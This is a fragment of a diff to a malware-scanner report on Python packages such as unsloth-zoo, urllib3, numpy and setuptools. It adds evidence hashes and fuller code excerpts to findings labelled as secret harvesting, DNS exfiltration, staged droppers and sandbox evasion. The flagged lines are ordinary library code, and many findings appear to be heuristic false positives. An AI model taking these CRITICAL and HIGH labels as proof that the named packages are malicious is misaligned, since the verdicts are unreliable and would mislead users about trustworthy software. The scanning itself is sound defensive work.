+      "evidence_hash": "b9c4ba436828f24516d8f3e46fd00d9de6eafd209ca9c47ee48362821324ad74"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/test_convert_hf_to_gguf_patcher.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L454: if os.environ.get(\"GITHUB_TOKEN\"): | L455: headers[\"Authorization\"] = f\"Bearer {os.environ['GITHUB_TOKEN']}\"\nNetwork: L458: r = requests.get(base_url + rel, timeout=15, headers=headers)"
+      "evidence": "Env: L454: if os.environ.get(\"GITHUB_TOKEN\"): | L455: headers[\"Authorization\"] = f\"Bearer {os.environ['GITHUB_TOKEN']}\"\nNetwork: L458: r = requests.get(base_url + rel, timeout=15, headers=headers)",
+      "evidence_hash": "c9361b4fd33f46714705dfeb989de0ac062b7a87f5065d181bb1e85d2ffa507f"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/test_quantize_gguf_q2_k_l.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L67: input_gguf=\"/tmp/in.gguf\","
+      "evidence": "L67: input_gguf=\"/tmp/in.gguf\",",
+      "evidence_hash": "216f29ee64ac93a92cc95749355552be7c243a2affc0a83b072641a00bac4c8f"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/test_upstream_pinned_symbols_transformers.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L60: token = os.environ.get(\"GITHUB_TOKEN\") or os.environ.get(\"GH_TOKEN\")\nNetwork: L30: import urllib.request | L59: req = urllib.request.Request(url) | L64: with urllib.request.urlopen(req, timeout=15) as r:"
+      "evidence": "Env: L60: token = os.environ.get(\"GITHUB_TOKEN\") or os.environ.get(\"GH_TOKEN\")\nNetwork: L30: import urllib.request | L59: req = urllib.request.Request(url) | L64: with urllib.request.urlopen(req, timeout=15) as r:",
+      "evidence_hash": "74fd2dbc3539ca11e9dc1fe054e7c139f281cfbbb346c240eddd37219ce54b89"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/device_type.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L137: value = os.environ.get(key, \"\")\nNetwork: L37: import urllib.request | L82: request = urllib.request.Request( | L87: with urllib.request.urlopen(request, timeout = 2.5) as response:"
+      "evidence": "Env: L137: value = os.environ.get(key, \"\")\nNetwork: L37: import urllib.request | L82: request = urllib.request.Request( | L87: with urllib.request.urlopen(request, timeout = 2.5) as response:",
+      "evidence_hash": "a7578e1a9cf3be689231517d03f95ae799773c58a8d74cc5ccacd1a6155a778d"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/llama_cpp.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L847: with tarfile.open(archive_path, \"r:gz\") as archive:\nNetwork: L657: response = requests.get(url, timeout = timeout, headers = headers, stream = stream) | L1546: response = requests.get( | L2694: check = requests.get(llama_cpp_"
+      "evidence": "Archive: L881: with tarfile.open(archive_path, \"r:gz\") as archive:\nNetwork: L691: response = requests.get(url, timeout = timeout, headers = headers, stream = stream) | L1582: response = requests.get( | L2730: check = requests.get(llama_cpp_chat_file, timeout = 5)",
+      "evidence_hash": "ecb1cfa283828be5e1cc325fa3cc4cc5a1c1b04c6f6c337e3b015dbd7774b496"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/llama_cpp.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L125: keynames = \"\\n\" + \"\\n\".join(os.environ.keys()) | L649: token = os.environ.get(\"GH_TOKEN\") or os.environ.get(\"GITHUB_TOKEN\")\nNetwork: L657: response = requests.get(url, timeout = timeout, headers = headers, stream = stream) | L154"
+      "evidence": "Env: L125: keynames = \"\\n\" + \"\\n\".join(os.environ.keys()) | L683: token = os.environ.get(\"GH_TOKEN\") or os.environ.get(\"GITHUB_TOKEN\")\nNetwork: L691: response = requests.get(url, timeout = timeout, headers = headers, stream = stream) | L1582: response = requests.get( | L2730: check = requests.get(llama_cpp_chat_file, timeout = 5)",
+      "evidence_hash": "692f4e1c0da49dd54d4e05bf19d31d18ce34827337c1869e96f7739064d4cf06"
     },
     {
       "package": "urllib3",
       "file": "urllib3/response.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L557: if retries is not None and retries.history:\nNetwork: L13: from http.client import HTTPMessage as _HttplibHTTPMessage | L14: from http.client import HTTPResponse as _HttplibHTTPResponse | L1403: \"Body should be http.client.HTTPResp"
+      "evidence": "FS: L557: if retries is not None and retries.history:\nNetwork: L13: from http.client import HTTPMessage as _HttplibHTTPMessage | L14: from http.client import HTTPResponse as _HttplibHTTPResponse | L1403: \"Body should be http.client.HTTPResponse like. \"",
+      "evidence_hash": "9ed12dbfab37a6ca11906ae27a4bcc742d0961d036d7aaaf3399db426b5888b1"
     },
     {
       "package": "urllib3",
       "file": "urllib3/util/ssl_.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L318: sslkeylogfile = os.path.expandvars(os.environ.get(\"SSLKEYLOGFILE\"))\nNetwork: L329: sock: socket.socket, | L347: sock: socket.socket, | L364: sock: socket.socket,"
+      "evidence": "Env: L318: sslkeylogfile = os.path.expandvars(os.environ.get(\"SSLKEYLOGFILE\"))\nNetwork: L329: sock: socket.socket, | L347: sock: socket.socket, | L364: sock: socket.socket,",
+      "evidence_hash": "8a6441fddc1fb990bcc4418f8118c39a116878b7bb63f54101a67af5cb46e6fa"
     },
     {
       "package": "attrs",
       "file": "attr/_make.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L226: bytecode = compile(script, filename, \"exec\") | L1632: hash_def += \", _cache_wrapper=__import__('attr._make')._make._CacheHashWrapper):\"\nExec: L227: eval(bytecode, globs, locs)"
+      "evidence": "Obfusc: L226: bytecode = compile(script, filename, \"exec\") | L1632: hash_def += \", _cache_wrapper=__import__('attr._make')._make._CacheHashWrapper):\"\nExec: L227: eval(bytecode, globs, locs)",
+      "evidence_hash": "68b484ecd82817376e5c198958c440576b7c73b6f5dbdf3dfbaa5eb6bd77a5ea"
     },
     {
       "package": "beartype",
       "file": "beartype/_util/func/utilfuncmake.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L271: func_code_compiled = compile(func_code, func_filename, 'exec')\nExec: L278: exec(func_code_compiled, func_globals, func_locals)"
+      "evidence": "Obfusc: L271: func_code_compiled = compile(func_code, func_filename, 'exec')\nExec: L278: exec(func_code_compiled, func_globals, func_locals)",
+      "evidence_hash": "fe10125add674d22202ed67de0c8dfc53c2dbdd56033e20480fcaf3b999aeecd"
     },
     {
       "package": "botocore",
       "file": "botocore/vendored/six.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L87: __import__(name)\nExec: L735: exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")"
+      "evidence": "Obfusc: L87: __import__(name)\nExec: L735: exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
+      "evidence_hash": "7234964b313eb3e164959cdca9251a7681b17a11df740dbc20b5b21d4164d3e7"
     },
     {
       "package": "cffi",
       "file": "cffi/setuptools_ext.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L25: code = compile(src, filename, 'exec')\nExec: L26: exec(code, glob, glob)"
+      "evidence": "Obfusc: L25: code = compile(src, filename, 'exec')\nExec: L26: exec(code, glob, glob)",
+      "evidence_hash": "31c4475de16599744abd232b4ef2e957e02757e84458070a4b0dce2d047d79fb"
     },
     {
       "package": "ddgs",
       "file": "ddgs/dht/libp2p_client.py",
       "check": "DNS exfiltration / tunneling patterns",
       "severity": "HIGH",
-      "evidence": "L15: import dns.resolver | L63: logger.debug(\"dnspython not installed, skipping dnsaddr resolution\") | L67: answers = dns.resolver.resolve(f\"_dnsaddr.{dnsaddr_domain}\", \"TXT\")"
+      "evidence": "L15: import dns.resolver | L63: logger.debug(\"dnspython not installed, skipping dnsaddr resolution\") | L67: answers = dns.resolver.resolve(f\"_dnsaddr.{dnsaddr_domain}\", \"TXT\")",
+      "evidence_hash": "2f27227d47e84a3972fe08041c716cea1c65616cd007575c138379db347cf69e"
     },
     {
       "package": "dill",
       "file": "dill/_dill.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L595: return marshal.loads(string) | L1011: module = __import__(names[0]) | L1061: submodule = getattr(__import__(module, None, None, [obj]), obj)\nExec: L979: return eval(repr_str) | L1037: return eval(attr+'.__dict__[\"'+name+'\"]')"
+      "evidence": "Obfusc: L596: return marshal.loads(string) | L1012: module = __import__(names[0]) | L1065: submodule = getattr(__import__(module, None, None, [obj]), obj)\nExec: L980: return eval(repr_str) | L1038: return eval(attr+'.__dict__[\"'+name+'\"]')",
+      "evidence_hash": "14a9197f3ca48837b3e0437d30825b40c927539e12a9d20f4572ae3f20b152d4"
     },
     {
       "package": "dill",
       "file": "dill/source.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L394: lines, lnum = [\"%s = __import__('%s', fromlist=['%s']).%s\\n\" % (name,module,name,name)], 0\nExec: L60: _ = eval(\"lambda %s : %s\" % (lhs,rhs), globals(),locals()) | L82: _f = eval(\"lambda %s : %s\" % (_lhs,_rhs), globals(),locals"
+      "evidence": "Obfusc: L396: lines, lnum = [\"%s = __import__('%s', fromlist=['%s']).%s\\n\" % (name,module,name,name)], 0\nExec: L60: _ = eval(\"lambda %s : %s\" % (lhs,rhs), globals(),locals()) | L82: _f = eval(\"lambda %s : %s\" % (_lhs,_rhs), globals(),locals()) | L397: obj = eval(lines[0].lstrip(name + ' = '))",
+      "evidence_hash": "b9a48cc9d98b74c88b5901761f7d3942abcc0f2ea40b363dfb9705977eb599e3"
     },
     {
       "package": "dnspython",
       "file": "dns/query.py",
       "check": "DNS exfiltration / tunneling patterns",
       "severity": "HIGH",
-      "evidence": "L142: import dns.resolver | L144: resolver = dns.resolver.Resolver() | L414: resolver: Optional[\"dns.resolver.Resolver\"],"
+      "evidence": "L142: import dns.resolver | L144: resolver = dns.resolver.Resolver() | L414: resolver: Optional[\"dns.resolver.Resolver\"],",
+      "evidence_hash": "7777fb81e2e7dbf79f73d620739323d6c4561cd4fc6d1bceffaa19c858163779"
     },
     {
       "package": "execnet",
       "file": "execnet/gateway_base.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1290: co = compile(source + \"\\n\", file_name or \"<remote exec>\", \"exec\")\nExec: L1291: exec(co, loc)"
+      "evidence": "Obfusc: L1290: co = compile(source + \"\\n\", file_name or \"<remote exec>\", \"exec\")\nExec: L1291: exec(co, loc)",
+      "evidence_hash": "00efc88fa6ba294522fec38fa745857bf31abe29524dae39148326fb026e2796"
     },
     {
       "package": "execnet",
       "file": "execnet/script/socketserver.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L63: co = compile(source + \"\\n\", \"<socket server>\", \"exec\")\nExec: L45: exec( | L47: exec(source, locs)\"\"\" | L61: source = eval(source)"
+      "evidence": "Obfusc: L63: co = compile(source + \"\\n\", \"<socket server>\", \"exec\")\nExec: L45: exec( | L47: exec(source, locs)\"\"\" | L61: source = eval(source)",
+      "evidence_hash": "3849441fa2690007301fe8891fad9d6aff6ec19bfac30ee14fe78052c6c2d4fe"
     },
     {
       "package": "fastmcp-slim",
       "file": "fastmcp/server/auth/providers/jwt.py",
       "check": "Embedded cryptographic key + network calls (encrypted exfil pattern)",
       "severity": "HIGH",
-      "evidence": "Key: L187: \"-----BEGIN PUBLIC KEY-----\", | L188: \"-----BEGIN RSA PUBLIC KEY-----\",\nNetwork: L225: http_client: httpx.AsyncClient | None = None, | L411: else httpx.AsyncClient(timeout=httpx.Timeout(10.0))"
+      "evidence": "Key: L187: \"-----BEGIN PUBLIC KEY-----\", | L188: \"-----BEGIN RSA PUBLIC KEY-----\",\nNetwork: L225: http_client: httpx.AsyncClient | None = None, | L411: else httpx.AsyncClient(timeout=httpx.Timeout(10.0))",
+      "evidence_hash": "3d8310983e1abbad0de4ab1304110549f05f765952820d1980f1191306e79052"
     },
     {
       "package": "hypothesis",
       "file": "hypothesis/internal/scrutineer.py",
       "check": "Anti-analysis/sandbox evasion + suspicious behavior",
       "severity": "HIGH",
-      "evidence": "Anti: L76: return sys.gettrace() is None | L113: sys.settrace(self.trace) | L136: sys.settrace(None)"
+      "evidence": "Anti: L76: return sys.gettrace() is None | L113: sys.settrace(self.trace) | L136: sys.settrace(None)",
+      "evidence_hash": "448948f855622b2d7ed2b83d7e3f3cb9c0bc12c2627447205d08efa7b07ff3d6"
     },
     {
       "package": "ipython",
       "file": "IPython/core/debugger.py",
       "check": "Anti-analysis/sandbox evasion + suspicious behavior",
       "severity": "HIGH",
-      "evidence": "Anti: L960: trace_function = sys.gettrace() | L961: sys.settrace(None) | L973: sys.settrace(trace_function)"
-    },
-    {
-      "package": "ipython",
-      "file": "IPython/core/debugger.py",
-      "check": "exec/eval with payload hidden in a docstring/string",
-      "severity": "HIGH",
-      "evidence": "marshal/compile/obfuscation: L310: # needed by any code which calls __import__(\"__main__\") after"
+      "evidence": "Anti: L960: trace_function = sys.gettrace() | L961: sys.settrace(None) | L973: sys.settrace(trace_function)",
+      "evidence_hash": "b24c714729a0b04db312be6b615593d99d541b24c129762cffa5846a73451907"
     },
     {
       "package": "ipython",
       "file": "IPython/core/debugger_backport.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L79: code = compile(source, \"<string>\", \"exec\")\nExec: L130: exec(source_with_closure, {}, ns) | L138: exec(code, globals, locals_copy, closure=cells) | L200: exec(code, globals, locals)"
+      "evidence": "Obfusc: L79: code = compile(source, \"<string>\", \"exec\")\nExec: L130: exec(source_with_closure, {}, ns) | L138: exec(code, globals, locals_copy, closure=cells) | L200: exec(code, globals, locals)",
+      "evidence_hash": "37c874adf670078f0fd3da79f8d2575601e289c5361622e7cd8ce6681b5837fc"
     },
     {
       "package": "ipython",
       "file": "IPython/core/magics/execution.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1178: self.shell.compile(ast_setup, \"<magic-timeit-setup>\", \"exec\") | L1179: self.shell.compile(ast_stmt, \"<magic-timeit-stmt>\", \"exec\") | L1200: code = self.shell.compile(timeit_ast, \"<magic-timeit>\", \"exec\")\nExec: L1213: exec(cod"
+      "evidence": "Obfusc: L1178: self.shell.compile(ast_setup, \"<magic-timeit-setup>\", \"exec\") | L1179: self.shell.compile(ast_stmt, \"<magic-timeit-stmt>\", \"exec\") | L1200: code = self.shell.compile(timeit_ast, \"<magic-timeit>\", \"exec\")\nExec: L1213: exec(code, glob, ns) | L1398: out = eval(code, glob, local_ns) | L1412: exec(code, glob, local_ns)",
+      "evidence_hash": "93b6c8411ffb6cb183af367b875b2225c2738dcb9682494ef0fd40b073a89448"
     },
     {
       "package": "ipython",
       "file": "IPython/core/magics/execution.py",
       "check": "Anti-analysis/sandbox evasion + suspicious behavior",
       "severity": "HIGH",
-      "evidence": "Anti: L972: trace = sys.gettrace() | L983: sys.settrace(trace)"
+      "evidence": "Anti: L972: trace = sys.gettrace() | L983: sys.settrace(trace)",
+      "evidence_hash": "da94355433f3194fdbf33fcb2b40249642220cd6d627def8869894ff5028cd91"
     },
     {
       "package": "jinja2",
       "file": "jinja2/environment.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L709: return compile(source, filename, \"exec\")\nExec: L1228: exec(code, namespace)"
+      "evidence": "Obfusc: L709: return compile(source, filename, \"exec\")\nExec: L1228: exec(code, namespace)",
+      "evidence_hash": "c83baefa595ac66cc3a817ceab17d18fc180f664498dd21b340607b5ccfb053c"
     },
     {
       "package": "kgb",
       "file": "kgb/spies.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L934: eval(compile(func_code_str, '<string>', 'exec'),\nExec: L934: eval(compile(func_code_str, '<string>', 'exec'),"
+      "evidence": "Obfusc: L934: eval(compile(func_code_str, '<string>', 'exec'),\nExec: L934: eval(compile(func_code_str, '<string>', 'exec'),",
+      "evidence_hash": "3cfe0dfffda663926bd5d95a892d73e54942df7a93c609d27331867987871e9e"
     },
     {
       "package": "langid",
       "file": "langid/train/common.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L44: yield marshal.load(t)\nExec: L85: key = eval(row[0])"
+      "evidence": "Obfusc: L44: yield marshal.load(t)\nExec: L85: key = eval(row[0])",
+      "evidence_hash": "04109f77110c59510b619a31d497fc34e746966c698ccec416005d28955e67ca"
     },
     {
       "package": "matplotlib",
       "file": "matplotlib/sphinxext/plot_directive.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L368: compile(text, '<string>', 'exec')\nExec: L585: exec('import numpy as np\\n' | L588: exec(str(setup.config.plot_pre_code), ns) | L594: exec(code, ns)"
+      "evidence": "Obfusc: L368: compile(text, '<string>', 'exec')\nExec: L585: exec('import numpy as np\\n' | L588: exec(str(setup.config.plot_pre_code), ns) | L594: exec(code, ns)",
+      "evidence_hash": "4117b130c287c3baccccb8f67440eed105e37d63735adbf4ceb5ed4cbca28cff"
     },
     {
       "package": "multiprocess",
       "file": "multiprocess/tests/__init__.py",
       "check": "Anti-analysis/sandbox evasion + suspicious behavior",
       "severity": "HIGH",
-      "evidence": "Anti: L440: time.sleep(300)"
+      "evidence": "Anti: L446: time.sleep(300)",
+      "evidence_hash": "074ecb34e2ccef7a201a6a15c12984584f16ecaa1effde28151edc0058802a1a"
     },
     {
       "package": "networkx",
       "file": "networkx/utils/decorators.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L911: compiled = compile(code, filename, \"exec\")\nExec: L912: exec(compiled, globl, locl)"
+      "evidence": "Obfusc: L911: compiled = compile(code, filename, \"exec\")\nExec: L912: exec(compiled, globl, locl)",
+      "evidence_hash": "a926615c3af972b05ebd52722f1e1df3e65869b9336e7b8021f1a17e10e8adaf"
     },
     {
       "package": "numba",
       "file": "numba/np/ufunc/array_exprs.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L382: code_obj = compile(ast_module, expr_filename, 'exec')\nExec: L383: exec(code_obj, namespace)"
+      "evidence": "Obfusc: L382: code_obj = compile(ast_module, expr_filename, 'exec')\nExec: L383: exec(code_obj, namespace)",
+      "evidence_hash": "e9dfe0ff2f8d1176eea5ee4f5156c5ad443115f1f8481a9b6fd6e1391b0dfea0"
     },
     {
       "package": "numba",
       "file": "numba/tests/support.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L879: __import__(modname)\nExec: L813: eval(co, globs, ns)"
+      "evidence": "Obfusc: L879: __import__(modname)\nExec: L813: eval(co, globs, ns)",
+      "evidence_hash": "72b8b62a1269b540fae8a278ba719ecebd595b525c793c3d864fb0aa992e7479"
     },
     {
       "package": "numba",
       "file": "numba/tests/test_firstlinefinder.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L95: code = compile(source, filename, \"exec\")\nExec: L77: exec(source, globalns) | L98: exec(code, globalns)"
+      "evidence": "Obfusc: L95: code = compile(source, filename, \"exec\")\nExec: L77: exec(source, globalns) | L98: exec(code, globalns)",
+      "evidence_hash": "420869d18cb24f41091cf4eef66dc30f89894618e652031a18ef43a19a7a23a4"
     },
     {
       "package": "numba",
       "file": "numba/tests/test_funcdesc.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L24: compiled = compile(code, filename, 'exec')\nExec: L25: exec(compiled, objs)"
+      "evidence": "Obfusc: L24: compiled = compile(code, filename, 'exec')\nExec: L25: exec(compiled, objs)",
+      "evidence_hash": "811f9d995f55d65e20516e29b4a844435c13ab4181cf392a80be8b4c29c3ddc6"
     },
     {
       "package": "numba",
       "file": "numba/tests/test_import.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L33: __import__(mod)\nExec: L43: modlist = set(eval(out.strip())) | L97: modlist = set(eval(out.strip()))"
+      "evidence": "Obfusc: L33: __import__(mod)\nExec: L43: modlist = set(eval(out.strip())) | L97: modlist = set(eval(out.strip()))",
+      "evidence_hash": "6834b0176e26a08fd4096cdf31fa1b8d1898447511c35624373a7ded3d601b31"
     },
     {
       "package": "numba",
       "file": "numba/tests/test_np_functions.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L7106: exec(compile(funcstr, '<string>', 'exec'), globals(), dct)\nExec: L7106: exec(compile(funcstr, '<string>', 'exec'), globals(), dct)"
+      "evidence": "Obfusc: L7106: exec(compile(funcstr, '<string>', 'exec'), globals(), dct)\nExec: L7106: exec(compile(funcstr, '<string>', 'exec'), globals(), dct)",
+      "evidence_hash": "d7a57fc2fa9e4d2cacdeb47552c834c32e4461b43383165c726b5b2ee5b13e24"
     },
     {
       "package": "numpy",
       "file": "numpy/testing/_private/utils.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1627: code = compile(code_str, f'Test name: {label} ', 'exec')\nExec: L1346: exec(astr, dict) | L1632: exec(code, globs, locs)"
+      "evidence": "Obfusc: L1627: code = compile(code_str, f'Test name: {label} ', 'exec')\nExec: L1346: exec(astr, dict) | L1632: exec(code, globs, locs)",
+      "evidence_hash": "5dcc31080159009d8bb95925381ef9d52e1b922f72bec32956a39e0207daa614"
     },
     {
       "package": "numpy",
       "file": "numpy/testing/_private/utils.py",
       "check": "Anti-analysis/sandbox evasion + suspicious behavior",
       "severity": "HIGH",
-      "evidence": "Anti: L2777: original_trace = sys.gettrace() | L2779: sys.settrace(None) | L2782: sys.settrace(original_trace)"
+      "evidence": "Anti: L2777: original_trace = sys.gettrace() | L2779: sys.settrace(None) | L2782: sys.settrace(original_trace)",
+      "evidence_hash": "33ae2bc81961735bff4a067998224105c22f8cd3ed4e360b2a6742e599389d14"
     },
     {
       "package": "numpy",
       "file": "numpy/tests/test_public_api.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L543: core_submodule = __import__(\nExec: L405: eval(module_name)"
+      "evidence": "Obfusc: L543: core_submodule = __import__(\nExec: L405: eval(module_name)",
+      "evidence_hash": "614f502a9fc175a24d7de4e824ed5804628b151ddaaa1b073f32160c0fba7a99"
     },
     {
       "package": "pillow",
       "file": "PIL/Image.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L422: __import__(f\"{__spec__.parent}.{plugin}\", globals(), locals(), []) | L490: __import__(f\"{__spec__.parent}.{plugin}\", globals(), locals(), [])\nExec: L3772: def eval(image: Image, *args: Callable[[int], float]) -> Image:"
+      "evidence": "Obfusc: L422: __import__(f\"{__spec__.parent}.{plugin}\", globals(), locals(), []) | L490: __import__(f\"{__spec__.parent}.{plugin}\", globals(), locals(), [])\nExec: L3772: def eval(image: Image, *args: Callable[[int], float]) -> Image:",
+      "evidence_hash": "e5e8594c9aa99a19918197accaefc0cc68da35ad1cb342f116c9bbdf76df3f1a"
     },
     {
       "package": "protobuf",
       "file": "protobuf-3.19.6-nspkg.pth",
       "check": "Unusually large executable .pth (539 bytes)",
       "severity": "HIGH",
-      "evidence": "1 import line(s) in 539-byte .pth file"
+      "evidence": "1 import line(s) in 539-byte .pth file",
+      "evidence_hash": "7e6e8cd7751fa441364e59e783480cb057f28e48a5f8cc50fb5012319c987bd9"
     },
     {
       "package": "pygments",
       "file": "pygments/formatters/__init__.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L38: mod = __import__(module_name, None, None, ['__all__'])\nExec: L103: exec(f.read(), custom_namespace)"
+      "evidence": "Obfusc: L38: mod = __import__(module_name, None, None, ['__all__'])\nExec: L103: exec(f.read(), custom_namespace)",
+      "evidence_hash": "d3589f2c8641bd64a4d1fb9e46864e67778631f5dcb91b3a8af47f988b763384"
     },
     {
       "package": "pygments",
       "file": "pygments/lexers/__init__.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L45: mod = __import__(module_name, None, None, ['__all__'])\nExec: L154: exec(f.read(), custom_namespace)"
+      "evidence": "Obfusc: L45: mod = __import__(module_name, None, None, ['__all__'])\nExec: L154: exec(f.read(), custom_namespace)",
+      "evidence_hash": "d3589f2c8641bd64a4d1fb9e46864e67778631f5dcb91b3a8af47f988b763384"
     },
     {
       "package": "pytest",
       "file": "_pytest/_py/path.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L626: mod = __import__(hashtype) | L1118: __import__(modname)\nExec: L1153: exec(f.read(), mod.__dict__)"
+      "evidence": "Obfusc: L626: mod = __import__(hashtype) | L1118: __import__(modname)\nExec: L1153: exec(f.read(), mod.__dict__)",
+      "evidence_hash": "71240cce1352281a4549b302ca27f103ae3fd22b01192d65ff0dedc9a8f8eba0"
     },
     {
       "package": "pytest",
       "file": "_pytest/assertion/rewrite.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L393: co = marshal.load(fp) | L395: trace(f\"_read_pyc({source}): marshal.load error {e}\")\nExec: L188: exec(co, module.__dict__)"
+      "evidence": "Obfusc: L393: co = marshal.load(fp) | L395: trace(f\"_read_pyc({source}): marshal.load error {e}\")\nExec: L188: exec(co, module.__dict__)",
+      "evidence_hash": "31cf50c301387558c829d3f020407c12c02f887aa0cbe54f4d003aab8bba65ab"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/externals/array_api_compat/torch/__init__.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L19: __import__(__package__ + '.linalg') | L20: __import__(__package__ + '.fft')\nExec: L12: exec(f\"{n} = torch.{n}\")"
+      "evidence": "Obfusc: L19: __import__(__package__ + '.linalg') | L20: __import__(__package__ + '.fft')\nExec: L12: exec(f\"{n} = torch.{n}\")",
+      "evidence_hash": "e183d5fe2b0cea0c999cffbdf94c70f4bf2b448d2627e249bfd7bca3335ae1c2"
     },
     {
       "package": "scipy",
       "file": "scipy/optimize/_optimize.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L4155: __import__(mod_name)\nExec: L323: def eval(x):"
+      "evidence": "Obfusc: L4155: __import__(mod_name)\nExec: L323: def eval(x):",
+      "evidence_hash": "f15b2f277c5760894ab05dcfd15144b45311399d2217ad891219ff3f536eecb0"
     },
     {
       "package": "setuptools",
       "file": "pkg_resources/__init__.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L423: __import__(moduleOrReq) | L1739: code = compile(source, script_filename, 'exec') | L1750: script_code = compile(script_text, script_filename, 'exec')\nExec: L1740: exec(code, namespace, namespace) | L1751: exec(script_code, nam"
+      "evidence": "Obfusc: L423: __import__(moduleOrReq) | L1739: code = compile(source, script_filename, 'exec') | L1750: script_code = compile(script_text, script_filename, 'exec')\nExec: L1740: exec(code, namespace, namespace) | L1751: exec(script_code, namespace, namespace)",
+      "evidence_hash": "9b387077a8cf57e5c85b348d3567f08cff57bc1594a512cb26f84a93b89c6a89"
     },
     {
       "package": "setuptools",
       "file": "setuptools/_distutils/compilers/C/base.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1286: __import__(module_name)\nExec: L1113: if lib_type not in eval(expected):"
+      "evidence": "Obfusc: L1286: __import__(module_name)\nExec: L1113: if lib_type not in eval(expected):",
+      "evidence_hash": "3a6b2f50481370ae6328d8f32e7919d4f2fc67694d71a01e9aed61b26ebc4685"
     },
     {
       "package": "setuptools",
       "file": "setuptools/launch.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L31: code = compile(norm_script, script_name, 'exec')\nExec: L32: exec(code, namespace)"
+      "evidence": "Obfusc: L31: code = compile(norm_script, script_name, 'exec')\nExec: L32: exec(code, namespace)",
